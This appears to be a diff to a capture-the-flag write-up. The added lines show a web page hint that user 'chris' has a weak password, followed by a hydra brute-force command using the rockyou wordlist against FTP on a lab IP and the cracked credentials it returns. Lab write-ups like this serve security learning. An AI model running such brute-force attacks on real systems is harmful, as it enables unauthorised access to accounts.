@@ -36,6 +36,16 @@ Server: Apache/2.4.29 (Ubuntu)
 Location: agent_C_attention.php
 Content-Type: text/html; charset=UTF-8
 
+Visiting -> agent_C_attention.php
+
+By switching the agent to C reveals:
+Attention chris,
+Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!
+From,
+Agent R
+
+
+hydra -t 16 -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.11.80 -V -I 
 
 
 [21][ftp] host: 10.10.11.80   login: chris   password: crystal
